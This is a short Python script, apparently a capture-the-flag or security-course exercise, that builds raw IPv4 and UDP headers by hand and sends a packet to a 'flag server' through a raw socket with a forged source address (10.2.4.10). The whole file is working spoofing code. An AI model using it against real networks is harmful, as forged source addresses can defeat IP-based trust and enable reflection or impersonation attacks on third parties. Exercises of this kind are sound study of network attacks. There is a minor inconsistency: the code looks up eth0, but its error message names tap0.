import socket
import struct
import sys
import errno
import psutil

def get_ip_address_iface(family, ifacename):
    interface_list = dict()
    for interface, snics in psutil.net_if_addrs().items():
        for snic in snics:
            if snic.family == family:
                interface_list[interface] = snic.address
    try:
        return interface_list[ifacename]
    except:
        return ""

def make_ipv4_header_udp(srcip, dstip, datal):
    srcip = socket.inet_aton(srcip) 
    dstip = socket.inet_aton(dstip) 

    ver = 4                     
    ihl = 5                     
    dscp_ecn = 0                
    tlen = datal + 28           
    ident = socket.htons(54321) 
    flg_frgoff = 0              
    ttl = 64                    
    ptcl = 17                   
    chksm = 0                   

    return struct.pack(
        "!"     
        "2B"    
        "3H"    
        "2B"    
        "H"     
        "4s"    
        "4s"    
        , (ver << 4) + ihl, dscp_ecn, tlen, ident, flg_frgoff, ttl, ptcl, chksm, srcip,
            dstip)

def make_udp_header(srcprt, dstprt, datal):
    return struct.pack(
        "!4H"   
        , srcprt, dstprt, datal+8, 0)

def make_udp_packet(src, dst, data):
    ip_header = make_ipv4_header_udp(src[0], dst[0], len(data))
    udp_header = make_udp_header(src[1], dst[1], len(data))
    return ip_header + udp_header + bytes(data,'UTF-8')

FLAG_SERVER_ADDR = 'flagserv.cse543.rev.fish'               
FLAG_SERVER_IP = socket.gethostbyname(FLAG_SERVER_ADDR)    
FLAG_SERVER_PORT = 13337                                   
SOURCE_PORT = 0                         
SPOOFED_SRC = '10.2.4.10'                                  
     
MESSAGE = get_ip_address_iface(socket.AF_INET, "eth0")      

if MESSAGE == "":
    print("tap0 interface")
    sys.exit()

print ("UDP target ADDR: %s" % FLAG_SERVER_ADDR)
print ("UDP target IP: %s" % FLAG_SERVER_IP)
print ("UDP target port: %d" % FLAG_SERVER_PORT)
print ("UDP source IP: %s" % SPOOFED_SRC)
print ("UDP source port: %d" % SOURCE_PORT)
print ("Message being sent: %s" % MESSAGE)

try:
    sock_snd = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    print ("Socket created")
except IOError as error:
    if error.errno != errno.EINTR:
        print ("Socket creation failed. Error Code : " +
            str(error.errno))
        sys.exit()

raw_packet = make_udp_packet((SPOOFED_SRC, SOURCE_PORT), (FLAG_SERVER_IP,
    FLAG_SERVER_PORT),
    MESSAGE)

try:
    sock_snd.sendto(raw_packet, (FLAG_SERVER_IP, FLAG_SERVER_PORT))
    print ("successful!")
except IOError as error:
    if error.errno != errno.EINTR:
        print ("Socket connection failed. Error Code : " +
            str(error.errno))
        sys.exit()
